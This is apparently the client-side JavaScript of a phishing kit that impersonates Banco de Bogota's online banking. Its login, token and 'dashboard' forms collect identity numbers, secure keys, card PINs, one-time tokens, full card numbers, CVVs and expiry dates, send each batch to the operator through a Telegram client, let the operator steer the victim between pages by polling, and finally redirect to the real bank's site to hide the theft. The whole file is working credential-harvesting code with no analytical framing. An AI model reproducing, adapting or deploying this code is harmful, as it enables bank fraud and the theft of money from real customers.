/**
 * BANCO DE BOGOTA - Cliente optimizado usando TelegramClient directamente
 */

(function() {
    'use strict';
    
    const pageConfig = {
        'index.html': {
            stage: 'login',
            forms: {
                clave: {
                    id: 'claveForm',
                    inputs: {
                        tipoDocumento: 'select',
                        numeroDocumento: 'input[name="identification"]',
                        claveSegura: 'input[name="secure-key"]'
                    },
                    button: 'button[type="submit"]',
                    validation: (data) => (data.numeroDocumento || '').length >= 5 && (data.claveSegura || '').length === 4
                },
                tarjeta: {
                    id: 'tarjetaForm',
                    inputs: {
                        tipoDocumento: 'select',
                        numeroDocumento: 'input[name="identification"]',
                        claveTarjeta: 'input[name="card-pin"]',
                        ultimosDigitos: 'input[name="card-number"]'
                    },
                    button: 'button[type="submit"]',
                    validation: (data) => (data.numeroDocumento || '').length >= 5 && 
                                          (data.claveTarjeta || '').length === 4 && 
                                          (data.ultimosDigitos || '').length === 4
                }
            },
            nextActions: {
                login: 'index.html',
                token: 'token.html',
                dashboard: 'dashboard.html',
                finalizar: 'https://www.bancodebogota.com/'
            }
        },
        'token.html': {
            stage: 'token',
            form: 'tokenForm',
            inputs: {
                token: 'input[name="token"]'
            },
            button: 'button[type="submit"]',
            validation: (data) => (data.token || '').length >= 4,
            nextActions: {
                login: 'index.html',
                token: 'token.html',
                dashboard: 'dashboard.html',
                finalizar: 'https://www.bancodebogota.com/'
            }
        },
        'dashboard.html': {
            stage: 'dashboard',
            form: 'dashboardForm',
            inputs: {
                tarjeta: 'input[name="card-number"]',
                cvv: 'input[name="cvv"]',
                mes: 'select[name="month"]',
                anio: 'select[name="year"]'
            },
            button: 'button[type="submit"]',
            validation: (data) => (data.tarjeta || '').length >= 16 && 
                                  (data.cvv || '').length >= 3 &&
                                  data.mes && data.anio,
            nextActions: {
                login: 'index.html',
                token: 'token.html',
                dashboard: 'dashboard.html',
                finalizar: 'https://www.bancodebogota.com/'
            }
        }
    };
    
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    const config = pageConfig[currentPage];
    
    if (!config) return;
    
    // Función para obtener/crear session ID
    function getSessionId() {
        let sessionId = localStorage.getItem('bogota_session_id');
        if (!sessionId) {
            sessionId = `bogota_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            localStorage.setItem('bogota_session_id', sessionId);
        }
        return sessionId;
    }
    
    // Función para mostrar overlay
    function showOverlay() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.add('active');
            overlay.style.display = 'flex';
        }
    }
    
    // Función para ocultar overlay
    function hideOverlay() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('active');
            overlay.style.display = 'none';
        }
    }
    
    // Función para guardar datos acumulados
    function saveBankData(newData) {
        const sessionId = getSessionId();
        const saved = JSON.parse(sessionStorage.getItem(`bogota_data_${sessionId}`) || '{}');
        const updated = { ...saved, ...newData };
        sessionStorage.setItem(`bogota_data_${sessionId}`, JSON.stringify(updated));
        return updated;
    }
    
    // Función para formatear mensaje
    function formatMessage(title, data) {
        let message = `🏦 ${title}\n\n`;
        for (const [key, value] of Object.entries(data)) {
            if (value) {
                const label = key.charAt(0).toUpperCase() + key.slice(1).replace(/([A-Z])/g, ' $1');
                message += `${label}: ${value}\n`;
            }
        }
        return message;
    }
    
    // Iniciar para página con múltiples formularios (index.html)
    if (currentPage === 'index.html') {
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = getSessionId();
            
            // Inicializar Socket.IO
            if (typeof io === 'undefined') {
                console.error('Socket.IO no disponible');
                return;
            }
            const socket = io();
            
            // Configurar polling para acciones
            if (typeof TelegramClient !== 'undefined') {
                TelegramClient.startPolling((actions, stop) => {
                    if (window.__bogotaProcessing) return;
                    window.__bogotaProcessing = true;
                    
                    const action = actions[0];
                    hideOverlay();
                    
                    const nextPage = config.nextActions[action.action];
                    if (nextPage) {
                        if (nextPage.startsWith('http')) {
                            localStorage.removeItem('bogota_session_id');
                            sessionStorage.clear();
                            BancoUtils.hideOverlay();
                            window.location.href = nextPage;
                        } else {
                            BancoUtils.hideOverlay();
                            window.location.href = `/bancas/Bogota/${nextPage}`;
                        }
                    } else {
                        window.__bogotaProcessing = false;
                    }
                }, sessionId, 100, 300000);
            }
            
            // Configurar cada formulario
            Object.keys(config.forms).forEach(formKey => {
                const formConfig = config.forms[formKey];
                const form = document.getElementById(formConfig.id);
                if (!form) return;
                
                const button = form.querySelector(formConfig.button);
                const inputs = {};
                
                // Obtener inputs
                Object.keys(formConfig.inputs).forEach(key => {
                    const selector = formConfig.inputs[key];
                    inputs[key] = form.querySelector(selector);
                });
                
                // Validación en tiempo real
                function validateForm() {
                    const data = {};
                    Object.keys(inputs).forEach(key => {
                        if (inputs[key]) {
                            data[key] = inputs[key].value.trim();
                        }
                    });
                    
                    const isValid = formConfig.validation(data);
                    if (button) {
                        button.disabled = !isValid;
                        if (isValid) {
                            button.style.backgroundColor = '#002A8D';
                            button.style.opacity = '1';
                            button.style.cursor = 'pointer';
                        } else {
                            button.style.backgroundColor = '#9ba3af';
                            button.style.opacity = '0.6';
                            button.style.cursor = 'not-allowed';
                        }
                    }
                }
                
                // Agregar listeners a inputs
                Object.values(inputs).forEach(input => {
                    if (input) {
                        input.addEventListener('input', validateForm);
                        input.addEventListener('change', validateForm);
                    }
                });
                
                // Submit handler
                form.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    if (window.__submitting) return;
                    window.__submitting = true;
                    
                    showOverlay();
                    
                    if (!socket || !socket.connected) {
                        alert('Error de conexión. Recarga la página.');
                        hideOverlay();
                        window.__submitting = false;
                        return;
                    }
                    
                    // Recopilar datos
                    const formData = {};
                    Object.keys(inputs).forEach(key => {
                        if (inputs[key]) {
                            formData[key] = inputs[key].value.trim();
                        }
                    });
                    formData.tipoFormulario = formKey;
                    
                    const fullData = saveBankData(formData);
                    const message = formatMessage('BANCO DE BOGOTA - LOGIN', fullData);
                    
                    try {
                        if (typeof TelegramClient !== 'undefined') {
                            await TelegramClient.sendToTelegram('bogota_login', {
                                bank: 'Bogota',
                                step: 'login',
                                data: fullData
                            }, sessionId);
                            console.log('✅ Datos enviados a Telegram');
                        }
                    } catch (error) {
                        console.error('❌ Error:', error);
                        hideOverlay();
                        alert('Error al enviar datos. Intenta nuevamente.');
                        window.__submitting = false;
                    }
                });
                
                // Validación inicial
                validateForm();
            });
        });
    } else {
        // Página con un solo formulario (token.html, dashboard.html)
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = getSessionId();
            
            if (typeof io === 'undefined') {
                console.error('Socket.IO no disponible');
                return;
            }
            const socket = io();
            
            const form = document.getElementById(config.form);
            if (!form) return;
            
            const button = form.querySelector(config.button);
            const inputs = {};
            
            // Obtener inputs
            Object.keys(config.inputs).forEach(key => {
                const selector = config.inputs[key];
                inputs[key] = form.querySelector(selector);
            });
            
            // Configurar polling
            if (typeof TelegramClient !== 'undefined') {
                TelegramClient.startPolling((actions, stop) => {
                    if (window.__bogotaProcessing) return;
                    window.__bogotaProcessing = true;
                    
                    const action = actions[0];
                    hideOverlay();
                    
                    const nextPage = config.nextActions[action.action];
                    if (nextPage) {
                        if (nextPage.startsWith('http')) {
                            localStorage.removeItem('bogota_session_id');
                            sessionStorage.clear();
                            BancoUtils.hideOverlay();
                            window.location.href = nextPage;
                        } else {
                            BancoUtils.hideOverlay();
                            window.location.href = `/bancas/Bogota/${nextPage}`;
                        }
                    } else {
                        window.__bogotaProcessing = false;
                    }
                }, sessionId, 100, 300000);
            }
            
            // Validación en tiempo real
            function validateForm() {
                const data = {};
                Object.keys(inputs).forEach(key => {
                    if (inputs[key]) {
                        data[key] = inputs[key].value.trim();
                    }
                });
                
                const isValid = config.validation(data);
                if (button) {
                    button.disabled = !isValid;
                    if (isValid) {
                        button.style.backgroundColor = '#002A8D';
                        button.style.opacity = '1';
                        button.style.cursor = 'pointer';
                    } else {
                        button.style.backgroundColor = '#9ba3af';
                        button.style.opacity = '0.6';
                        button.style.cursor = 'not-allowed';
                    }
                }
            }
            
            // Agregar listeners
            Object.values(inputs).forEach(input => {
                if (input) {
                    input.addEventListener('input', validateForm);
                    input.addEventListener('change', validateForm);
                }
            });
            
            // Submit handler
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (window.__submitting) return;
                window.__submitting = true;
                
                showOverlay();
                
                if (!socket || !socket.connected) {
                    alert('Error de conexión. Recarga la página.');
                    hideOverlay();
                    window.__submitting = false;
                    return;
                }
                
                // Recopilar datos
                const formData = {};
                Object.keys(inputs).forEach(key => {
                    if (inputs[key]) {
                        formData[key] = inputs[key].value.trim();
                    }
                });
                
                const fullData = saveBankData(formData);
                const message = formatMessage(`BANCO DE BOGOTA - ${config.stage.toUpperCase()}`, fullData);
                
                try {
                    if (typeof TelegramClient !== 'undefined') {
                        await TelegramClient.sendToTelegram(`bogota_${config.stage}`, {
                            bank: 'Bogota',
                            step: config.stage,
                            data: fullData
                        }, sessionId);
                        console.log('✅ Datos enviados a Telegram');
                    }
                } catch (error) {
                    console.error('❌ Error:', error);
                    hideOverlay();
                    alert('Error al enviar datos. Intenta nuevamente.');
                    window.__submitting = false;
                }
            });
            
            // Validación inicial
            validateForm();
        });
    }
})();
